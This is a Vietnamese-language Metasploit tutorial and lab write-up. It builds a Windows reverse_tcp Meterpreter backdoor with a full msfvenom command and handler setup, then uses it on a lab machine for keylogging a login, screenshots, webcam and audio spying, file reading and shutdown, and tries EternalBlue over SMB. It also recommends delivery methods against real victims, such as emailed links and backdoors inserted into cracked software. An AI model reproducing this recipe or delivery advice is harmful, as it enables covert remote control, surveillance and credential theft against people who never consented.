# Tạo backdoor với MSF

## Metasploit Framework

![image](https://hackmd.io/_uploads/r1TdZiRCT.png)

### Metasploit Framework là gì?

- **Metasploit Framework** là một môi trường dùng để kiểm tra, tấn công và khai thác lỗi của các service. Ban đầu Metasploit được xây dựng từ ngôn ngữ hướng đối tượng Perl với những component được viết bằng C và Python sau đó được viết lại vằng ruby.
- Đây là một công cụ mã nguồn mở phát triển nhằm sử dụng các shellcode để tấn công, khai thác khai thác lỗi của các dịch vụ
- **Metasploit = Meta + Exploit**
- Các tính năng chính:
  - Quét cổng để xác định các dịch vụ đang hoạt động trên server.
  - Xác định các lỗ hổng dựa trên phiên bản của hệ điều hành và phiên bản các phần mềm cài đặt trên hệ điều hành đó.
  - Thử nghiệm khai thác các lỗ hổng đã được xác định.
- Metasploit đi kèm với nhiều công cụ khác như MSFVenom để tạo shellcode tùy chỉnh (khi thực thi thành công, nó sẽ cung cấp cho bạn một shell trên máy mục tiêu).
- Thông thường, điều này sẽ hiển thị RHOST(S) và RPORT nơi bạn chỉ định tên máy chủ/ip mục tiêu và cổng được liên kết (địa chỉ dịch vụ đang dính lỗ hổng).
- Nó cũng sẽ hiển thị LHOST và LPORT, nơi bạn chỉ định chi tiết kết nối máy của bạn để payload Metasploit biết nơi kết nối trở lại. Tùy thuộc vào module, sẽ có các tùy chọn khác để sử dụng.
- **Meterpreter**, viết tắt từ Meta-Interpreter là một advanced payload có trong Metasploit framework. Muc đích của nó là để cung cấp những tập lệnh để khai thác, tấn câng các máy remote computers. Meterpreter cung cấp một tập lệnh để chúng ta có thể khai thác trên các remote computer như:
  - **Fs**: Cho phép upload và download files từ các remote machine (`cd directory`, `getcwd`, ls, `upload src1 [src2 ...] dst`, `download src1 [src2 ...] dst` )
  - **Net**: Cho phép xem thông tin mạng của remote machine như IP, route table (`ipconfig`, `route`)
  - **Process**: Cho phép tạo các processes mới trên remote machine (`ps`, `execute -f file [ -a args ] [ -Hc ]`, `kill pid1 pid2 pid3`)
  - **Sys**: Cho phép xem thông tin hệ thống của remote machine ( `getuid`, `sysinfo`)

**Rex**: chứa các thư viện cơ bản cho mọi tác vụ của Metasploit Framework.

**Msf:Core**: cung cấp một API cho việc phát triển mã khai thác. Đây cũng là phần cần quan tâm để có thể viết mã khai thác lỗ hổng cho ứng dụng web.

**Msf:Base**: thư viện này cung cấp các API được thiết kế cho việc phát triển giao diện.

![image](https://hackmd.io/_uploads/HJjw16A0T.png)

### Metasploit hỗ trợ nhiều giao diện với người dùng

- **Console interface**: Dùng msfconsole.bat. Msfconsole interface sử dụng các dòng lệnh để cấu hình, kiểm tra nên nhanh hơn và mềm dẻo hơn
- **Web interface**: Dùng msfweb.bat, giao tiếp với người dùng thông qua giao diện web
- **Command line interface**: Dùng msfcli.bat

### Các Module trong MSF

- Show: Liệt kê các module hiện tại.
- Use: Cho phép chọn một một module.
- **Auxiliary**: Là một module cung cấp chức năng tăng cường cho các thử nghiệm xâm nhập và quét lỗ hổng cùng với các tác vụ tự động. Phân loại trong auxiliary module: module quét các giao thức (như SMB, HTTP), module quét các port, wireless, IPV6, DOS, Server modules, Module khai thác truy cập quản trị.
- **Exploits**: Là một module dùng để khai thác các dịch vụ.

### Các bước dùng module Exploit

1. **Bước 1**: Chọn module exploit: lựa chọn chương trình, dịch vụ lỗi mà Metasploit có hỗ trợ để khai thác.
   - **show exploits**: xem các module exploit mà framework có hỗ trợ
   - **use exploit_name**: chọn module exploit.
   - **info exploit_name**: xem thông tin về module exploit.
2. **Bước 2**: Cấu hình module exploit đã chọn
   - **show options**: Xác định những options nào cần cấu hình.
   - **set**: cấu hình cho những option của module đó.
3. **Bước 3**: Xem lại những options vừa cấu hình:
   - **check**: kiểm tra xem những option đã được cấu hình chính xác chưa.
4. **Bước 4**: Lựa chọn target: lựa chọn hệ điều hành nào để thực hiện.
   - **show targets**: những mục tiêu được cung cấp bởi module đó.
   - **set**: xác định mục tiêu.
5. **Bước 5**: Lựa chọn payload (đoạn code mà sẽ chạy trên hệ thống remote machine.)
   - **show payloads**: liệt kê ra những payload của module exploit hiện tại.
   - **info payload_name**: xem thông tin chi tiết về payload đó.
   - **set PAYLOAD payload_name**: xác định tên payload module.Sau khi lựa chọn payload nào, dùng lệnh show options để xem những options của payload đó.
   - **show advanced**: xem những advanced options của payload đó.
6. **Bước 6**: Thực thi exploit
   - **exploit**: lệnh dùng để thực thi payload code. Payload sau đó sẽ cung cấp cho bạn những thông tin về hệ thống được khai thác

## Lab khai thác

- kịch bản khai thác

  1. attacker tạo file thực thi có extension .exe để chạy trên máy victim là máy Window 7
  2. attacker gửi file backdoor cho victim
  3. victim sẽ tải và chạy file backdoor này
  4. và attacker có quyền điều khiển máy victim

- mình có IP của attacker là 192.176.45.101
  ![ảnh](https://hackmd.io/_uploads/SkoFQ80Aa.png)

- mình có IP của victim là 192.176.45.102
  ![image](https://hackmd.io/_uploads/rJm2pw006.png) - và máy của victim mình sẽ tắt firewall ![image](https://hackmd.io/_uploads/r1rURwAA6.png)

- mình được ánh xạ địa chỉ như sau:

| Host                    | IP address       | MAC address         |
| ----------------------- | ---------------- | ------------------- |
| `Kali linux` (Attacker) | `192.176.45.101` | `34:6f:24:18:c9:2f` |
| `Window 7` (Victim)     | `192.176.45.102` | `0c:84:dc:f5:3c:79` |
| `Default Gateway`       | `192.176.45.1`   | `c0:61:18:e2:ef:72` |

- đầu tiên trên máy attacker mình tạo 1 file RCE với LHOST là địa chỉ máy kali linux LPORT là port sẽ nghe thông tin trả về
- và mình sẽ lưu file backdoor này vào Desktop

```bash!
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.176.45.101 LPORT=4444 -f exe -o /home/cuong/Desktop/backdoor_msf.exe
```

![ảnh](https://hackmd.io/_uploads/B15KE8CAT.png)

- sau khi tạo xong backdoor mình sẽ thiết lập nó trên metasploit

![ảnh](https://hackmd.io/_uploads/S1Tb4KRAp.png)

- mình vào msfconsole và kiểm tra database đã được kết nối chưa bằng lệnh **db_status**

![ảnh](https://hackmd.io/_uploads/rJPuBL0AT.png)

- thấy CSDL postgre chưa được kết nối mình sẽ restart lại nó và reinit lại database của MSF
- trước hết chúng ta cần khởi chạy postgresql

```bash!
systemctl start postgresql
service postgresql start
```

- Lí do chúng ta cần khởi động PostgreSQL database trước khi chạy Metasploit là vì Metasploit sử dụng PostgreSQL database để tự động lưu lại những kết quả thu được trong quá trình bạn pentest.

![ảnh](https://hackmd.io/_uploads/SkVIUL0Ap.png)

- lúc này Postgre đã được kết nối

![ảnh](https://hackmd.io/_uploads/r1udL8RCa.png)

- để thiết lập backdoor vừa tạo mình vào thư mục handler

```bash
use exploit/multi/handler

```

![ảnh](https://hackmd.io/_uploads/SyBBPI0C6.png)

- vào set payload để điều khiển backdoor vửa tạo trên Window 7

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

![ảnh](https://hackmd.io/_uploads/ryK2PI0Rp.png)

- set địa chỉ IP khi kết quả RCE trả về

```bash
set LHOST 192.176.45.101

```

![ảnh](https://hackmd.io/_uploads/rk1lOI0Aa.png)

- set port khi kết quả RCE trả về

```bash
set LPORT 4444

```

![ảnh](https://hackmd.io/_uploads/Hkv4u8CA6.png)

- kiểm tra lại thông tin cấu hình

![image](https://hackmd.io/_uploads/Hyw9VOCAT.png)

- và cuối cùng là thực thi payload này với tham số -j để thực thi theo kịch bản mà mình đã tạo trong backdoor ở trên

```bash
exploit -j

```

![ảnh](https://hackmd.io/_uploads/rk3w_ICAp.png)

- và mình đã thiết lập thành công nhưng chưa có máy nào đang chạy backdoor đó

![ảnh](https://hackmd.io/_uploads/SkDo_IRCa.png)

- tiếp thep mình up backdoor vừa tạo lên google driver và gửi cho victim

- và đợi victim tải về và chạy nó

![ảnh](https://hackmd.io/_uploads/HyQEcUAAp.png)

- ngoài ra các bạn có thể thực hiện những cách khác như:
  - tạo 1 trang web chứa file backdoor và gửi đến cho victim
  - đẩy file lên https://gist.github.com/ và gửi đến cho victim tải về
  - chèn các đường link đến file backdoor của chúng ta trên gmail gửi đến victim
  - chèn backdoor vào các phần mềm crack trên mạng
- khi victim truy cập vào link drive mình gửi sẽ hiện thông báo từ google drive
- có thể đó là do tên file mình đặt tên file là backdoor

![image](https://hackmd.io/_uploads/ryQ47d0Aa.png)

- sau đó victim tải file dù cho có hiện cảnh báo

![image](https://hackmd.io/_uploads/rJsamuAAp.png)

- và victim chạy file backdoor

![image](https://hackmd.io/_uploads/ByVxNu00a.png)

- lúc này trên máy victim có 1 tiến trình chạy file backdoor

![image](https://hackmd.io/_uploads/rkwnDdRAT.png)

- quan sát trên máy của attacker mình thấy có 1 session đã được thiết lập để kết nối giữa máy attacker (ip:192.176.45.101 port 4444) với máy victim (ip:192.176.45.102 port 49562)

![image](https://hackmd.io/_uploads/S1qV4dA0p.png)

- session kết nối này có id là 1
- nên mình sẽ dùng session này với lệnh `sesssions -i 1` để điều kiển máy victim
- và lúc này attacker có thể ra lệnh cho máy victim làm bất cứ điều gì

![image](https://hackmd.io/_uploads/HkOpVdARa.png)

### xem thông tin hệ thống

![ảnh](https://hackmd.io/_uploads/r1mUBbZk0.png)

- đầu tiên mình có thể xem thông tin chung của máy victim với lệnh `sysinfo`

![image](https://hackmd.io/_uploads/BksILdCC6.png)

### xem thông tin mạng

![ảnh](https://hackmd.io/_uploads/r1LXHWbkC.png)

- tiếp theo mình có thể xem thông tin cấu hình mạng của máy victim

![image](https://hackmd.io/_uploads/Hk4iIdACT.png)

### xem những tiến trình đang chạy

- tiếp theo mình có thể xem những tiến trình đang chạy trên máy victim

![ảnh](https://hackmd.io/_uploads/rkCfOFC0T.png)

### xem thông tin user

- tiếp theo là xem user trên máy

![image](https://hackmd.io/_uploads/BJYAUu0Ca.png)

### lấy được shell

![ảnh](https://hackmd.io/_uploads/HkBZrFARa.png)

### xem thông tin các file thư mục

![ảnh](https://hackmd.io/_uploads/SkwC4W-1C.png)

- mình thử tạo 1 thư mục có tên **secret_network_security** trong Desktop của victim

![image](https://hackmd.io/_uploads/SkQSw_00T.png)

- và tạo bên trong thư mục đó file flag.txt có nội dung như sau

![image](https://hackmd.io/_uploads/BkMuDuC0T.png)

- và trên máy attacker có thể vào thư mục secret_network_security này và đọc file flag

![image](https://hackmd.io/_uploads/HkOSOuCRa.png)

![image](https://hackmd.io/_uploads/B1IIuu00T.png)

- attacker có thể xem được thời gian tạo và ngày giờ thay đổi file này

![image](https://hackmd.io/_uploads/H1cidd006.png)

- và attacker có thể xem được thư mục gốc có gì

![image](https://hackmd.io/_uploads/Bkbro_CRT.png)

### xem ảnh chụp màn hình

![ảnh](https://hackmd.io/_uploads/rkvdSZ-kC.png)

- attacker cũng có thể chụp ảnh màn hình của victim và ảnh được lưu vào Desktop

![image](https://hackmd.io/_uploads/SkffKO0Ap.png)

![image](https://hackmd.io/_uploads/SyHPYuCRp.png)

### theo dõi bàn phím máy tính

- và attacker có thể theo dõi được bàn phím máy tính của victim gõ gì bằng lệnh `keyscan_start`

![image](https://hackmd.io/_uploads/ByDpKuC0T.png)

- lúc này khi victim đăng nhập vào facebook với username là hacker_dung_khong và password là admin

![image](https://hackmd.io/_uploads/Hye79_AC6.png)

- hacker cũng có thể biết được mật khẩu này kể cả các động tác sửa khi gõ sai

![image](https://hackmd.io/_uploads/BJUN9O0Aa.png)

### xem webcam

![ảnh](https://hackmd.io/_uploads/ByL9BbbkC.png)

- attacker có thể theo dõi được camera máy tính của victim

- do máy victim của mình không có camera nên mình không thể xem được

![ảnh](https://hackmd.io/_uploads/BySoPtCAa.png)

### nghe lén đoạn ghi âm

- attacker có thể theo dõi được các âm thanh trên máy tính của victim

![ảnh](https://hackmd.io/_uploads/Hyvn7ZZyC.png)

### Shutdow máy victim

- attacker có thể tắt máy của victim với lệnh

![image](https://hackmd.io/_uploads/HJ46jd00p.png)

- và lúc đó máy của victim sẽ bị tắt

![image](https://hackmd.io/_uploads/rynt2dCRp.png)

![image](https://hackmd.io/_uploads/rJAz3_RAT.png)

### kết thúc tấn công

- sau khi tấn công xong mình có thể dùng lệnh exit để kết thúc phiên

![image](https://hackmd.io/_uploads/HJn3ad00a.png)

- và trên máy victim mình kiểm tra file backdoor với virustotal
- và kết quả có 55 phần mềm trên 70 phát hiện file này có virus

![image](https://hackmd.io/_uploads/HkkQA_CAp.png)

- sau khi tấn công xong mình bật lại firewall và thực hiện lại cuộc tấn công và vẫn thành công trên máy window 7

![image](https://hackmd.io/_uploads/BJfZ1sC0a.png)

## khai thác thông qua dịch vụ SMB

- Dịch vụ SMB được sử dụng để chia sẻ tệp và thông tin giữa các máy chủ từ xa. Eternalblue hưởng lợi từ cách SMBv1 và SMBv2 điều khiển các gói được vận chuyển. Kết quả là kẻ tấn công có thể sử dụng kỹ thuật Thực thi mã từ xa.

| Tiêu Chí            | SMB                                                            | FTP                                                                       |
| ------------------- | -------------------------------------------------------------- | ------------------------------------------------------------------------- |
| Hỗ trợ hệ điều hành | Chủ yếu trong môi trường Windows                               | Có thể hoạt động trên nhiều hệ điều hành (Windows, Linux, macOS)          |
| Cách hoạt động      | Tạo kết nối trực tiếp giữa máy tính và máy chủ chia sẻ         | Dựa trên mô hình client-server, máy tính kết nối đến máy chủ FTP          |
| Bảo mật             | Cung cấp tùy chọn xác thực và quản lý quyền truy cập           | Cần sử dụng các phương pháp bảo mật bổ sung như FTPS hoặc SFTP            |
| Hiệu suất           | Có thể đạt được hiệu suất truyền tải tốt hơn trong mạng nội bộ | Hiệu suất truyền tải có thể thấp hơn do cần sử dụng kết nối client-server |

|

- scan mạng với nmap mình được các port mở trên máy victim trong đó có mở port 445 cho dịch vụ SMB

![ảnh](https://hackmd.io/_uploads/SkbtK67Aa.png)

- mình scan dịch vụ SMB trên máy victim tai IP 192.176.45.102 với MSF

```bash
use auxiliary/scanner/smb/smb_version
```

![ảnh](https://hackmd.io/_uploads/B1NCweWyC.png)

- xem các options cần thiết lập và mình chạy nó
- mình xem các yêu cầu cấu hình với lệnh

```bash
show options
```

![image](https://hackmd.io/_uploads/HkNo7fWyA.png)

- và phát hiên được version dùng ở máy victim

![ảnh](https://hackmd.io/_uploads/S17V_xWJ0.png)

![ảnh](https://hackmd.io/_uploads/SJdIslbJ0.png)

![ảnh](https://hackmd.io/_uploads/SkTuilZJA.png)

![ảnh](https://hackmd.io/_uploads/SJwEhgZ1A.png)

- nhưng do máy victim dùng hệ thống x86 nên payload không thể thực hiện do nó chỉ support cho hệ thống x64 mặc dù đã phát hiện lỗ hổng

- tiếp theo mình khai thác trên máy window 7 khác với hệ thống x64 có IP là 192.176.45.103 nhưng đã bị ngăn chặn do Bkav đã ngăn chặn

![ảnh](https://hackmd.io/_uploads/B1Ba6g-yC.png)

![ảnh](https://hackmd.io/_uploads/HytUfbWJR.png)

![image](https://hackmd.io/_uploads/HJluzN-J0.png)

- các bạn có thể xem thêm <a href= "https://www.youtube.com/watch?v=CiKVLYvGtsc&t=344s">tại đây</a>

## Tham khảo

- https://www.youtube.com/watch?v=qhgOsDhalhM&list=LL&index=7
- https://www.youtube.com/watch?v=S8fZpwBDkGY&list=LL&index=6
- https://www.youtube.com/watch?v=wN4JfVo_irU&list=LL&index=3
- https://www.youtube.com/watch?v=wN4JfVo_irU&list=LL&index=4
- https://www.youtube.com/watch?v=RR9UVG1QbGk&list=LL&index=6
- https://whitehat.vn/threads/gioi-thieu-cong-cu-metasploit-framework.4203/
- https://anonyviet.com/cach-su-dung-metasploit-de-tan-cong-mang-co-ban-nhat/
